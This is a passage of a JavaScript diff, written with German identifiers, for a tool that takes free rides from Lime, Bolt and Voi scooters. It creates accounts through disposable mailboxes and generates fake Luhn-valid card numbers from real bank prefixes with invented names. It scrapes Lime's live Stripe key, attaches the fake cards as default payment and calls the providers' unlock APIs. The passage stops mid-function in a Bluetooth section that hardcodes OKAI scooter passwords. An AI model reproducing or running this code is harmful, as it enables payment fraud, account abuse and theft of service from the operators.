+    { art:"form", d:{ email:adr } },
+    { art:"json", d:{ email:adr, user_agreement_version:4, user_agreement_country_code:"DE" } }
+  ];
+  let letzter = "";
+  for (const f of formen){
+    for (let runde = 0; runde < 3; runde++){
+      await warten();
+      const h = f.art === "form" ? HF(null) : H(null);
+      const body = f.art === "form" ? F(f.d) : J(f.d);
+      const r = await roh("https://web-production.lime.bike/api/rider/v2/onboarding/magic-link",
+        { method:"POST", headers:h, body:body });
+      if (r.status === 429){
+        const w = [4000, 8000, 18000][runde];
+        log("magic-link 429 · " + (w / 1000) + " s", "y");
+        await sleep(w);
+        continue;
+      }
+      const brauchbar = r.ok && !MUELL.test(r.text.slice(0, 200));
+      if (brauchbar){
+        log("Mail angefordert an " + adr + " · " + r.status + " " + f.art, "g");
+        return true;
+      }
+      letzter = r.status + " · " + saub(r.text);
+      log("magic-link " + f.art + " · " + letzter, "y");
+      if (/domain|email|invalid|exist|block/i.test(letzter)) sperreDom(adr.split("@")[1]);
+      break;
+    }
+  }
+  throw new Error("magic-link " + letzter);
+}
+
+async function limeLogin(tok, tiefe){
+  tiefe = tiefe || 0;
+  const formen = [
+    { h: HF(null), b: F({ magic_link_token: tok }) },
+    { h: H(null),  b: J({ magic_link_token: tok }) }
+  ];
+  let letzter = "";
+  for (const f of formen){
+    const r = await roh("https://web-production.lime.bike/api/rider/v2/onboarding/login",
+      { method:"POST", headers:f.h, body:f.b });
+    if (r.status === 429 && tiefe < 4){ await sleep(9000); return limeLogin(tok, tiefe + 1) }
+    const j = r.json || {};
+    const t = (j.token) || (j.user && j.user.token) || (j.data && j.data.token) || "";
+    if (t){
+      const at = (j.user && j.user.attributes) || {};
+      if (typeof at.balance_cents === "number") S.bal = at.balance_cents;
+      const d = at.default_payment_method;
+      if (d) S.def = (typeof d === "object") ? (d.id || "") : d;
+      return t;
+    }
+    letzter = r.status + " · " + saub(r.text);
+    log("Login-Variante · " + letzter, "y");
+  }
+  throw new Error("Login ohne Token · " + letzter);
+}
+
+async function limeApi(pfad, tok, o){
+  o = o || {};
+  o.headers = H(tok);
+  if (o.body && !o.method) o.method = "POST";
+  return roh("https://web-production.lime.bike/api/rider/v1" + pfad, o);
+}
+
+async function limeV2(pfad, tok, body){
+  return roh("https://web-production.lime.bike/api/rider/v2" + pfad,
+    { method:"POST", headers:H(tok), body:J(body) });
+}
+
+async function limePost(pfad, h, body){
+  return roh("https://web-production.lime.bike/api/rider/v1" + pfad,
+    { method:"POST", headers:h, body:body });
+}
+
+async function mailAnmelden(box){
+  await limeMail(box.adr);
+  let link = "";
+  for (let i = 0; i < MAIL_TAKT; i++){
+    await sleep(2000);
+    const t = await box.hole();
+    link = grabToken(t);
+    if (link) break;
+    if (i === 20) log("noch keine Mail · warte weiter", "y");
+  }
+  if (!link) throw new Error("keine Mail mit Link");
+  log("Link erhalten", "g");
+  return limeLogin(link);
+}
+
+/* ═══════ KARTE ═══════ */
+
+const BIN_V = ["453201", "491748", "455673", "471610", "414720",
+               "400344", "426684", "448527", "428238", "492901"];
+const BIN_M = ["510510", "543210", "552100", "539999", "510805",
+               "526468", "545762", "550281", "519196", "520000"];
+const NAMEN = [
+  ["Michael", "Keller"], ["Thomas", "Brandt"], ["Lena", "Sauer"],
+  ["Jonas", "Neumann"], ["Sandra", "Hoffmann"], ["Daniel", "Wagner"],
+  ["Katrin", "Vogel"], ["Andreas", "Berger"], ["Nina", "Franke"], ["Marco", "Schuster"]
+];
+
+function luhn(s){
+  let sum = 0, alt = false;
+  for (let i = s.length - 1; i >= 0; i--){
+    let d = +s[i];
+    if (alt){ d *= 2; if (d > 9) d -= 9 }
+    sum += d; alt = !alt;
+  }
+  return sum % 10 === 0;
+}
+function fixLuhn(b){
+  for (let c = 0; c <= 9; c++) if (luhn(b + c)) return b + c;
+  return b + "0";
+}
+
+function markeVon(n){
+  if (/^3[47]/.test(n)) return "AMEX";
+  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "MASTERCARD";
+  return "VISA";
+}
+
+function newCard(pre){
+  pre = pre || (S.bin || (rnd(3) === 0 ? BIN_M[rnd(BIN_M.length)] : BIN_V[rnd(BIN_V.length)]));
+  const amex = /^3/.test(pre);
+  const len = amex ? 15 : 16;
+  let n = pre;
+  while (n.length < len - 1) n += rnd(10);
+  n = fixLuhn(n);
+  const paar = NAMEN[rnd(NAMEN.length)];
+  return {
+    num: n,
+    mm: String(1 + rnd(12)).padStart(2, "0"),
+    yy: String(28 + rnd(5)),
+    cvc: String(rnd(amex ? 10000 : 1000)).padStart(amex ? 4 : 3, "0"),
+    vn: paar[0], nn: paar[1], name: paar[0] + " " + paar[1],
+    brand: markeVon(n),
+    rest: LIMIT, quelle: "fake"
+  };
+}
+
+function cardPaint(){
+  const c = S.card;
+  $("cBrand").textContent = c ? c.brand : "VISA";
+  $("cNum").textContent = c ? c.num.replace(/(.{4})/g, "$1 ").trim() : "•••• •••• •••• ••••";
+  $("cExp").textContent = c ? c.mm + "/" + c.yy : "--/--";
+  $("cCvc").textContent = c ? c.cvc : "---";
+  $("cName").textContent = c ? (c.name || "RIDER") : "RIDER";
+  $("cAmt").textContent = money(c ? c.rest : LIMIT);
+  $("cardBox").classList.toggle("off", !c);
+  $("bCopyNum").disabled = !c;
+  $("bCopyAll").disabled = !c;
+  $("bTest").disabled = !c;
+  $("karteText").value = c ? (
+    "Name:    " + c.name + "\n" +
+    "Nummer:  " + c.num + "\n" +
+    "Ablauf:  " + c.mm + "/" + c.yy + "\n" +
+    "CVC:     " + c.cvc + "\n" +
+    "Marke:   " + c.brand
+  ) : "";
+}
+
+const karteMerken = () => ls("karte", S.card);
+
+/* ═══════ STRIPE ═══════ */
+
+const PKRX = /pk_live_[A-Za-z0-9]{20,}/;
+const SEITEN = [
+  "https://www.lime.bike/", "https://www.lime.bike/de/", "https://www.lime.bike/en-de/",
+  "https://www.lime.bike/rider/", "https://www.li.me/", "https://www.li.me/en-de/",
+  "https://www.li.me/de/"
+];
+
+async function keySuchen(){
+  if (S.pk.lime) return S.pk.lime;
+  for (const p of SEITEN){
+    try {
+      const r = await roh(p);
+      const m = (r.text || "").match(PKRX);
+      if (m){
+        S.pk.lime = m[0]; ls("pk", S.pk); $("iPk").value = m[0];
+        log("Stripe-Schlüssel gefunden", "g");
+        return m[0];
+      }
+    } catch(_){}
+  }
+  log("kein Stripe-Schlüssel gefunden · eigenen eintragen", "y");
+  return "";
+}
+
+let stripeP = null;
+function loadStripe(){
+  if (window.Stripe) return Promise.resolve();
+  if (stripeP) return stripeP;
+  stripeP = new Promise((res, rej) => {
+    const s = document.createElement("script");
+    s.src = "https://js.stripe.com/v3";
+    s.onload = () => res();
+    s.onerror = () => { stripeP = null; rej(new Error("Stripe.js nicht ladbar")) };
+    document.head.appendChild(s);
+  });
+  return stripeP;
+}
+
+async function stripeObj(){
+  const pk = S.pk.lime || $("iPk").value.trim();
+  if (!pk) throw new Error("kein Stripe-Schlüssel");
+  await loadStripe();
+  if (!window.Stripe) throw new Error("Stripe.js fehlt");
+  return window.Stripe(pk);
+}
+
+async function tokenize(card){
+  const out = { pm:"", tok:"", fehler:"" };
+  if (!S.pk.lime && !$("iPk").value.trim()){
+    stat("suche Stripe-Schlüssel …", "warn");
+    await keySuchen().catch(() => {});
+  }
+  let st;
+  try { st = await stripeObj() }
+  catch(e){ out.fehler = err(e); return out }
+  const daten = { number: card.num, exp_month: +card.mm, exp_year: +card.yy, cvc: card.cvc, name: card.name };
+  if (st.createPaymentMethod){
+    try {
+      const r = await st.createPaymentMethod({ type:"card", card: daten });
+      if (r.paymentMethod) out.pm = r.paymentMethod.id;
+      else if (r.error) out.fehler = r.error.code || "abgelehnt";
+    } catch(e){ out.fehler = err(e) }
+  }
+  try {
+    const r = await st.createToken({ card: daten });
+    if (r.token) out.tok = r.token.id;
+    else if (r.error && !out.fehler) out.fehler = r.error.code || "abgelehnt";
+  } catch(e){ if (!out.fehler) out.fehler = err(e) }
+  return out;
+}
+
+async function hinterlegen(card, tok, tiefe){
+  tiefe = tiefe || 0;
+  const a = S.acct;
+  if (!a) throw new Error("kein Konto");
+  const pm = tok.pm || tok.tok;
+  if (!pm) return { ok:false, id:"", fehler:"kein Token" };
+
+  const koerper = [
+    J({ payment_method_id: pm, billing_country_code: "DE" }),
+    J({ payment_method_id: pm }),
+    J({ stripe_payment_method_id: pm, billing_country_code: "DE" }),
+    J({ payment_method_token: pm, billing_country: "DE" })
+  ];
+
+  let letzter = "";
+  for (const b of koerper){
+    const r = await limeApi("/payment_methods", a.t, { body: b });
+    if (r.status === 429 && tiefe < 3){ await sleep(8000); return hinterlegen(card, tok, tiefe + 1) }
+    if (r.ok){
+      const j = r.json || {};
+      const id = j.id || (j.payment_method && j.payment_method.id) || (j.data && j.data.id) || "";
+      log("Karte angenommen", "g");
+      return { ok:true, id:id };
+    }
+    letzter = r.status + " · " + saub(r.text);
+    log("Hinterlegen · " + letzter, "y");
+    if (r.status === 400 || r.status === 422) break;
+  }
+  return { ok:false, id:"", fehler:letzter };
+}
+
+async function alsStandard(id, tiefe){
+  tiefe = tiefe || 0;
+  const a = S.acct;
+  if (!a) throw new Error("kein Konto");
+  if (!id) throw new Error("keine Karten-ID");
+
+  const wege = [
+    () => limeApi("/payment_methods/" + id + "/set_default", a.t, { body: J({}) }),
+    () => limeApi("/payment_methods/" + id, a.t, { method:"PATCH", body: J({ default: true }) }),
+    () => limeApi("/users/me", a.t, { method:"PATCH", body: J({ default_payment_method_id: id }) }),
+    () => limeApi("/users/me", a.t, { method:"PATCH", body: J({ default_payment_method: id }) })
+  ];
+  for (const w of wege){
+    const r = await w();
+    if (r.status === 429 && tiefe < 2){ await sleep(7000); return alsStandard(id, tiefe + 1) }
+    if (r.ok){
+      S.def = id;
+      log("Karte ist Standardzahlweg", "g");
+      return true;
+    }
+    log("Standard setzen · " + r.status + " · " + saub(r.text), "y");
+  }
+  return false;
+}
+
+/* ═══════ BRAINTREE (VOI) ═══════ */
+
+function b64Lesen(s){
+  const roh = String(s || "").replace(/-/g, "+").replace(/_/g, "/");
+  const fehlt = (4 - roh.length % 4) % 4;
+  return atob(roh + "=".repeat(fehlt));
+}
+
+async function voiKarte(){
+  if (!S.voiTok) throw new Error("keine Voi-Sitzung");
+  let ct = "";
+  for (const p of ["/v2/payments/client_token", "/v1/payments/client_token",
+                   "/v2/payment_methods/client_token", "/v1/payments/token"]){
+    const r = await roh("https://api.voiapp.io" + p, { headers:{ "x-access-token": S.voiTok } });
+    const t = (r.json && (r.json.clientToken || r.json.client_token ||
+      (r.json.data && (r.json.data.clientToken || r.json.data.client_token)))) || "";
+    if (t){ ct = t; log("Braintree-Token über " + p, "h"); break }
+  }
+  if (!ct) throw new Error("kein Braintree-Token");
+
+  const cfg = JSON.parse(b64Lesen(ct));
+  const fp = cfg.authorizationFingerprint;
+  const mer = (cfg.configUrl || "").match(/merchants\/([^/]+)/);
+  if (!fp || !mer) throw new Error("Token unvollständig");
+
+  const c = S.card || newCard();
+  S.card = c; karteMerken(); cardPaint();
+
+  const koerper = {
+    creditCard: {
+      number: c.num, expirationMonth: c.mm, expirationYear: c.yy,
+      cvv: c.cvc, cardholderName: c.name,
+      billingAddress: { countryCodeAlpha2: "DE" }
+    },
+    authorizationFingerprint: fp,
+    _meta: { source: "form" }
+  };
+
+  const br = await roh("https://api.braintreegateway.com/merchants/" + mer[1] + "/client_api/v1/payment_methods", {
+    method:"POST",
+    headers:{ "Content-Type":"application/json", "Accept":"application/json" },
+    body:J(koerper)
+  });
+  const nonce = br.json && (br.json.paymentMethodNonce ||
+    (br.json.creditCard && (br.json.creditCard.nonce || br.json.creditCard.token)) ||
+    (br.json.paymentMethod && br.json.paymentMethod.nonce));
+  if (!nonce) throw new Error("Braintree " + br.status + " " + saub(br.text));
+
+  for (const p of ["/v1/payment_methods", "/v2/payment_methods"]){
+    const r = await roh("https://api.voiapp.io" + p, {
+      method:"POST",
+      headers:{ "x-access-token": S.voiTok, "Content-Type":"application/json" },
+      body:J({ token: nonce, nonce: nonce, payment_method_token: nonce,
+              type:"card", is_default:true, default:true })
+    });
+    if (r.ok){ S.voiKarte = true; log("Voi hat die Karte genommen", "g"); return true }
+    log("Voi-Karte · " + p + " · " + r.status + " " + saub(r.text), "y");
+  }
+  throw new Error("Voi nahm die Karte nicht");
+}
+
+/* ═══════ ZAHLWEG-PRÜFUNG ═══════ */
+
+function ampelSet(id, txt, art){
+  const el = $(id);
+  el.textContent = txt;
+  el.className = art || "";
+}
+
+async function wallet(){
+  const a = S.acct;
+  if (!a) throw new Error("kein Konto");
+  const r = await limeApi("/wallets", a.t);
+  const j = r.json || {};
+  const w = (j.wallets && j.wallets[0]) || j.wallet || {};
+  let liste = j.payment_methods || w.payment_methods || (j.data && j.data.payment_methods) || [];
+  if (!Array.isArray(liste)) liste = liste ? Object.values(liste) : [];
+  const rest = w.remaining_amount !== undefined ? w.remaining_amount
+    : w.balance !== undefined ? w.balance
+    : w.balance_cents !== undefined ? w.balance_cents / 100 : 0;
+  return { cent: Math.round((rest || 0) * 100), liste: liste, roh: r };
+}
+
+async function vorflug(){
+  const a = S.acct;
+  if (!a) throw new Error("erst Konto anlegen");
+
+  ampelSet("vDef", "läuft", "war");
+  ampelSet("vStd", "läuft", "war");
+  ampelSet("vWal", "läuft", "war");
+  ampelSet("vBlock", "läuft", "war");
+  ampelSet("vRate", "läuft", "war");
+
+  const w = await wallet().catch(() => null);
+  if (w){
+    const n = w.liste.length;
+    ampelSet("vDef", n ? n + " Stück" : "keine", n ? "ok" : "no");
+    S.bal = w.cent;
+    ampelSet("vWal", money(w.cent), w.cent > 0 ? "ok" : "war");
+  } else {
+    ampelSet("vDef", "nicht lesbar", "war");
+    ampelSet("vWal", "nicht lesbar", "war");
+  }
+
+  let std = S.def;
+  if (!std && w){
+    const t = w.liste.find(x => x && (x.default || x.is_default));
+    if (t) std = t.id || "";
+  }
+  if (std){ S.def = std; ampelSet("vStd", "gesetzt", "ok") }
+  else ampelSet("vStd", "fehlt", "no");
+
+  let blocker = [];
+  try {
+    const g = await ort();
+    const r = await limeApi("/views/rider_map_start_blockers?user_latitude=" + g.lat +
+      "&user_longitude=" + g.lng, a.t);
+    const j = r.json || {};
+    let liste = j.blockers || (j.data && j.data.blockers) || [];
+    if (!Array.isArray(liste)) liste = [];
+    blocker = liste.map(b => (b && (b.kind || b.type || b.title)) || String(b)).filter(Boolean);
+    ampelSet("vBlock", blocker.length ? blocker.join(", ").slice(0, 40) : "keine", blocker.length ? "no" : "ok");
+  } catch(e){
+    ampelSet("vBlock", "nicht lesbar", "war");
+  }
+
+  try {
+    const g = await ort();
+    const r = await limeApi("/bikes/area_rate_plan?latitude=" + g.lat + "&longitude=" + g.lng + "&accuracy=8", a.t);
+    const j = r.json || {};
+    const p = j.rate_plan || j.plan || (j.data && j.data.rate_plan) || {};
+    const start = p.unlock_fee_cents !== undefined ? p.unlock_fee_cents : p.start_fee_cents;
+    const min = p.per_minute_cents !== undefined ? p.per_minute_cents : p.minute_rate_cents;
+    if (start !== undefined || min !== undefined){
+      ampelSet("vRate", (start !== undefined ? money(start) + " Start · " : "") +
+        (min !== undefined ? money(min) + "/min" : ""), "ok");
+    } else ampelSet("vRate", "nicht lesbar", "war");
+  } catch(_){
+    ampelSet("vRate", "nicht lesbar", "war");
+  }
+
+  const fehltStd = !S.def;
+  stat(fehltStd ? "Zahlweg fehlt · Karte hinterlegen und als Standard setzen" :
+    (blocker.length ? "Blocker: " + blocker.join(", ") : "Zahlweg in Ordnung"),
+    fehltStd || blocker.length ? "warn" : "ok");
+  return { std: S.def, blocker: blocker };
+}
+
+/* ═══════ KONTO ═══════ */
+
+function sync(){
+  S.acct = S.konten[S.brand] || null;
+  S.card = (S.acct && S.acct.card) || lg("karte", null);
+  S.def = (S.acct && S.acct.def) || "";
+  paint();
+}
+
+const saveAcc = () => { ls("konten", S.konten) };
+
+async function guthaben(){
+  const w = await wallet();
+  return w.cent;
+}
+
+async function provision(){
+  if (S.prov) return;
+  S.prov = true; paint();
+  try {
+    for (let runde = 1; runde <= MAIL_RUNDEN; runde++){
+      stat("Konto · Runde " + runde, "warn");
+      const box = await raceBox();
+      try {
+        S.bal = 0;
+        const tok = await mailAnmelden(box);
+        const a = { adr: box.adr, dom: box.dom, t: tok, card: null, rest: 0, def: S.def };
+        S.konten[S.brand] = a; saveAcc();
+        S.acct = a;
+        log("Konto steht · " + box.adr, "g");
+        await sleep(800);
+        const rest = await guthaben().catch(() => S.bal || 0);
+        a.rest = rest;
+        const c = newCard();
+        S.card = c; karteMerken(); cardPaint();
+        const t = await tokenize(c).catch(e => ({ fehler: err(e) }));
+        if (t.pm || t.tok){
+          const h = await hinterlegen(c, t).catch(e => ({ ok:false, fehler: err(e) }));
+          if (h.ok){
+            c.id = h.id;
+            a.card = c;
+            const std = await alsStandard(h.id).catch(() => false);
+            if (std) a.def = h.id;
+            saveAcc();
+            cstat(std ? "Karte hinterlegt und Standard · " + c.brand
+              : "Karte hinterlegt · Standard offen", std ? "g" : "y");
+            await sleep(400);
+            await vorflug().catch(() => {});
+          } else {
+            cstat("Karte nicht angenommen · " + (h.fehler || "?"), "e");
+          }
+        } else {
+          cstat("Karte nicht angenommen · " + (t.fehler || "?"), "e");
+        }
+        stat("Konto bereit · " + money(rest), "ok");
+        paint();
+        return;
+      } catch(e){
+        log("Runde " + runde + " · " + err(e), "e");
+        if (/magic-link|Postfach|keine Mail|Login/i.test(err(e))) sperreDom(box.dom);
+        if (runde < MAIL_RUNDEN) await sleep(3000);
+      }
+    }
+    throw new Error("kein Konto zustande gekommen");
+  } finally { S.prov = false; paint() }
+}
+
+async function kontoLoeschen(){
+  const a = S.acct;
+  S.konten[S.brand] = null; saveAcc();
+  S.acct = null; S.card = null; S.def = "";
+  if (a && a.dom) sperreDom(a.dom);
+  paint();
+  stat("Konto gelöscht.", "ok");
+}
+
+/* ═══════ FAHRT ═══════ */
+
+const fahrtSecs = () => S.fahrt.laeuft ? Math.floor((Date.now() - S.fahrt.t0) / 1000) : 0;
+const fahrtUsed = () => Math.min(LIMIT, S.fahrt.base + Math.round(fahrtSecs() * PREIS_MIN));
+
+function fahrtPaint(){
+  const s = fahrtSecs();
+  const p = n => String(n).padStart(2, "0");
+  const h = Math.floor(s / 3600), m = Math.floor(s % 3600 / 60), x = s % 60;
+  $("rTime").textContent = h ? h + ":" + p(m) + ":" + p(x) : p(m) + ":" + p(x);
+  $("rTime").classList.toggle("on", S.fahrt.laeuft);
+  const u = fahrtUsed();
+  const rest = Math.max(0, LIMIT - u);
+  $("rUsed").textContent = money(u);
+  $("rRest").textContent = rest > 0 ? money(rest) : "leer";
+}
+
+function fahrtStart(){
+  clearInterval(S.fahrt.timer);
+  S.fahrt.t0 = Date.now();
+  S.fahrt.laeuft = true;
+  S.fahrt.timer = setInterval(fahrtPaint, 1000);
+  fahrtPaint();
+}
+function fahrtStop(){
+  if (S.fahrt.laeuft) S.fahrt.base = fahrtUsed();
+  S.fahrt.laeuft = false;
+  clearInterval(S.fahrt.timer);
+  fahrtPaint();
+}
+function fahrtReset(){
+  clearInterval(S.fahrt.timer);
+  S.fahrt = { t0:0, base:0, timer:0, laeuft:false };
+  fahrtPaint();
+}
+
+/* ═══════ ORT UND AUFLÖSUNG ═══════ */
+
+function ort(){
+  return new Promise((res, rej) => {
+    if (!navigator.geolocation) return rej(new Error("kein Standort"));
+    navigator.geolocation.getCurrentPosition(
+      p => res({ lat: p.coords.latitude, lng: p.coords.longitude }),
+      () => rej(new Error("Standort verweigert")),
+      { enableHighAccuracy: true, timeout: 12000, maximumAge: 20000 }
+    );
+  });
+}
+
+function pinListe(j){
+  if (!j) return [];
+  if (Array.isArray(j.data)) return j.data;
+  const d = j.data || {};
+  const l = d.bikes || d.vehicles || d.pins || d.bike_pins ||
+    (d.attributes && (d.attributes.bikes || d.attributes.pins)) || j.bikes || j.pins || [];
+  return Array.isArray(l) ? l : [];
+}
+
+function pinId(b){
+  return b.bike_id || b.id || b.vehicle_id || b.vehicle_uuid ||
+    (b.attributes && (b.attributes.bike_id || b.attributes.id)) || "";
+}
+function pinCode(b){
+  const a = b.attributes || b;
+  return String(a.plate_number || a.name || a.last_three || a.qr_code || b.code || "");
+}
+
+async function limeId(code){
+  const a = S.acct;
+  if (!a) throw new Error("kein Konto");
+  const ziel = String(code).toUpperCase();
+  const g = await ort();
+  const d = 0.006;
+  const q = "?ne_lat=" + (g.lat + d) + "&ne_lng=" + (g.lng + d) +
+            "&sw_lat=" + (g.lat - d) + "&sw_lng=" + (g.lng - d) +
+            "&user_latitude=" + g.lat + "&user_longitude=" + g.lng + "&zoom=18.0";
+  for (const p of ["/v2/map/bike_pins", "/v1/views/map"]){
+    const r = await roh("https://web-production.lime.bike/api/rider" + p + q, { headers:H(a.t) });
+    if (!r.ok){ log("Karte " + p + " · " + r.status, "y"); continue }
+    const liste = pinListe(r.json);
+    if (!liste.length){ log("Karte leer · " + p, "y"); continue }
+    const treffer = liste.find(b => pinCode(b).toUpperCase().indexOf(ziel) >= 0);
+    if (!treffer){ log("Nummer nicht auf der Karte (" + liste.length + " Pins)", "y"); continue }
+    const id = pinId(treffer);
+    if (id){ log("Nummer " + code + " → " + id, "h"); return id }
+  }
+  log("Nummer nicht auflösbar · sende sie direkt", "y");
+  return code;
+}
+
+async function boltSrv(g){
+  const r = await roh("https://rental-search.bolt.eu/categoriesOverview?lat=" + g.lat +
+    "&lng=" + g.lng + "&version=CI.24.0&deviceId=" + DEVTOK + "&deviceType=iphone&language=de", {
+    headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic })
+  });
+  const srv = r.json && r.json.data && r.json.data.server_url;
+  if (!srv) throw new Error("kein Bolt-Server · " + r.status);
+  S.boltSrv = srv;
+  return srv;
+}
+
+async function voiId(code){
+  const g = await ort();
+  const z = await roh("https://api.voiapp.io/v1/zones?lat=" + g.lat + "&lng=" + g.lng,
+    { headers:{ "x-access-token": S.voiTok } });
+  const zid = z.json && ((z.json.zones && z.json.zones[0] && z.json.zones[0].id) || z.json.id);
+  if (!zid) throw new Error("keine Zone · " + z.status);
+  const v = await roh("https://api.voiapp.io/v2/rides/vehicles?zone_id=" + zid,
+    { headers:{ "x-access-token": S.voiTok } });
+  const gruppen = (v.json && v.json.data && v.json.data.vehicle_groups) || [];
+  const alle = [];
+  gruppen.forEach(x => (x.vehicles || []).forEach(y => alle.push(y)));
+  const treffer = alle.find(x => String(x.short || "").toUpperCase() === String(code).toUpperCase());
+  if (!treffer) throw new Error("Kurzcode nicht gefunden (" + alle.length + ")");
+  return treffer.id;
+}
+
+/* ═══════ ENTSPERREN ═══════ */
+
+async function apiUnlock(force){
+  const a = S.acct;
+  if (!a) throw new Error("erst Konto anlegen");
+  if (!S.qr) throw new Error("erst QR oder Nummer erfassen");
+  if (!force && Date.now() - S.lastUn < 1500) return;
+  S.lastUn = Date.now();
+
+  if (S.brand === "bolt"){ await boltUnlock(); startKeep(); return }
+  if (S.brand === "voi"){ await voiUnlock(); startKeep(); return }
+
+  if (!S.def){
+    stat("Zahlweg wird geprüft …", "warn");
+    const vf = await vorflug().catch(() => ({ std:S.def, blocker:[] }));
+    if (!vf.std) log("ohne Standardzahlweg lehnt Lime ab", "y");
+  }
+
+  stat("Nummer wird aufgelöst …", "warn");
+  const id = await limeId(S.qr).catch(() => S.qr);
+
+  const versuche = [
+    { p:"/bikes/" + enc(id) + "/unlock", h:HF(a.t), b:F({ id: id }) },
+    { p:"/bikes/" + enc(id) + "/unlock", h:H(a.t),  b:J({ bike_id: id }) },
+    { p:"/bikes/" + enc(id) + "/unlock", h:H(a.t),  b:J({}) }
+  ];
+
+  let letzter = "";
+  for (const v of versuche){
+    const r = await limePost(v.p, v.h, v.b);
+    if (r.status === 429) await sleep(7000);
+    if (r.ok){
+      log("Lime-Entsperrung angenommen", "g");
+      stat("Roller entsperrt · Lime", "ok");
+      if (!S.fahrt.laeuft) fahrtStart();
+      startKeep();
+      return true;
+    }
+    letzter = r.status + " · " + saub(r.text);
+    log("Versuch · " + letzter, "y");
+    if (r.status === 404) break;
+  }
+  throw new Error("Lime lehnt ab · " + letzter);
+}
+
+async function boltUnlock(){
+  if (!S.boltBasic) throw new Error("erst Telefon bestätigen");
+  const g = await ort();
+  const srv = S.boltSrv || await boltSrv(g);
+  const d = await roh(srv + "/client/getVehicleDetails?vehicle_uuid=" + enc(S.qr) +
+    "&version=CI.23.0&deviceId=" + DEVTOK + "&deviceType=iphone&language=de&gps_lat=" + g.lat + "&gps_lng=" + g.lng,
+    { headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic }) });
+  const vid = d.json && d.json.data && d.json.data.vehicle && d.json.data.vehicle.id;
+  if (!vid) throw new Error("Roller unbekannt · " + d.status);
+
+  const r = await roh(srv + "/client/rentVehicle?version=CI.23.0&deviceId=" + DEVTOK +
+    "&deviceType=iphone&language=de&gps_lat=" + g.lat + "&gps_lng=" + g.lng, {
+    method:"POST",
+    headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic }),
+    body: J({ vehicle_id: vid })
+  });
+  if (!r.ok) throw new Error("Bolt lehnt ab · " + r.status + " " + saub(r.text));
+  log("Bolt-Freigabe angenommen", "g");
+  stat("Roller entsperrt · Bolt", "ok");
+  if (!S.fahrt.laeuft) fahrtStart();
+}
+
+async function voiUnlock(){
+  if (!S.voiTok) throw new Error("erst anmelden");
+  const id = await voiId(S.qr);
+  const wege = [
+    () => roh("https://api.voiapp.io/v2/rides/vehicles/" + id + "/unlock",
+      { method:"POST", headers:{ "x-access-token": S.voiTok, "Content-Type":"application/json" }, body:J({}) }),
+    () => roh("https://api.voiapp.io/v2/rides", {
+      method:"POST", headers:{ "x-access-token": S.voiTok, "Content-Type":"application/json" },
+      body:J({ vehicle_id: id }) })
+  ];
+  let letzter = "";
+  for (const w of wege){
+    const r = await w();
+    if (r.ok){
+      log("Voi-Freigabe angenommen", "g");
+      stat("Roller entsperrt · Voi", "ok");
+      if (!S.fahrt.laeuft) fahrtStart();
+      return true;
+    }
+    letzter = r.status + " · " + saub(r.text);
+    log("Voi-Variante · " + letzter, "y");
+  }
+  throw new Error("Voi lehnt ab · " + letzter);
+}
+
+async function apiLock(){
+  const a = S.acct;
+  if (!a || !S.qr) return false;
+  if (S.brand === "bolt" && S.boltSrv){
+    const r = await roh(S.boltSrv + "/client/finishRide?version=CI.23.0&deviceId=" + DEVTOK, {
+      method:"POST", headers: Object.assign({}, KOPF(), { Authorization: S.boltBasic }), body:J({})
+    }).catch(() => null);
+    if (r && r.ok) return true;
+  }
+  if (S.brand !== "lime") return false;
+  const id = await limeId(S.qr).catch(() => S.qr);
+  for (const v of [
+    { p:"/bikes/" + enc(id) + "/lock", h:HF(a.t), b:F({ id: id }) },
+    { p:"/bikes/" + enc(id) + "/lock", h:H(a.t),  b:J({ bike_id: id }) }
+  ]){
+    const r = await limePost(v.p, v.h, v.b).catch(() => null);
+    if (r && r.ok) return true;
+  }
+  return false;
+}
+
+/* ═══════ KETTE ═══════ */
+
+async function autoKette(){
+  if (!S.qr) throw new Error("erst QR scannen oder Nummer eintragen");
+  log("Kette · " + S.brand + " · " + S.qr, "h");
+
+  if (S.brand === "bolt"){
+    if (!S.boltBasic) throw new Error("Bolt braucht einmal die Telefonbestätigung");
+    await boltUnlock(); startKeep();
+    return;
+  }
+
+  if (S.brand === "voi"){
+    if (!S.voiTok) throw new Error("Voi braucht einmal den Link aus der Mail");
+    if (!S.voiKarte){
+      stat("Karte wird vorgelegt …", "warn");
+      const ok = await voiKarte().catch(e => { log("Voi-Karte · " + err(e), "y"); return false });
+      if (!ok) log("Voi-Karte abgelehnt · im Voi-Video trotzdem manuell eintragen", "y");
+    }
+    await voiUnlock(); startKeep();
+    return;
+  }
+
+  if (!S.acct){
+    stat("Konto wird gebaut …", "warn");
+    await provision();
+    if (!S.acct) throw new Error("Konto kam nicht zustande");
+  }
+
+  if (!S.acct.card){
+    stat("Karte wird hinterlegt …", "warn");
+    let c = S.card;
+    if (!c){ c = newCard(); S.card = c; karteMerken(); cardPaint() }
+    let t = await tokenize(c);
+    if (!t.pm && !t.tok){
+      log("erste Karte abgelehnt · würfle neu", "y");
+      c = newCard(); S.card = c; karteMerken(); cardPaint();
+      t = await tokenize(c);
+    }
+    if (!t.pm && !t.tok) throw new Error("Karte abgelehnt · " + (t.fehler || "?"));
+    const h = await hinterlegen(c, t);
+    if (!h.ok) throw new Error("Hinterlegen · " + (h.fehler || "?"));
+    c.id = h.id; S.acct.card = c;
+    const std = await alsStandard(h.id).catch(() => false);
+    if (std) S.acct.def = h.id;
+    saveAcc(); karteMerken(); paint();
+  }
+
+  if (!S.acct.def && S.acct.card && S.acct.card.id){
+    await alsStandard(S.acct.card.id).catch(() => {});
+  }
+
+  await apiUnlock(true);
+}
+
+/* ═══════ BLE ═══════ */
+
+const OKAI_SVC    = "00002c00-0000-1000-8000-00805f9b34fb";
+const OKAI_WRITE  = "00002c01-0000-1000-8000-00805f9b34fb";
+const OKAI_NOTIFY = "00002c03-0000-1000-8000-00805f9b34fb";
+const OKAI_PW     = "OKAIYLBT";
+const OKAI_SVC_PW = "OKAI_CAR";
+
+let seqN = 0;
+const nextSeq = () => {
+  seqN = (seqN + 1) & 0xFFFF;
+  return seqN.toString(16).toUpperCase().padStart(4, "0");
+};
+
+function packAT(op, felder){
+  const f = (felder || []).map(String);
+  return "AT+" + op + "=" + (f.length ? f.join(",") + "," : "") + nextSeq() + "$\r\n";
+}
+
+function crc16(u8){
+  let c = 0;
+  for (const b of u8){
+    c ^= b << 8;
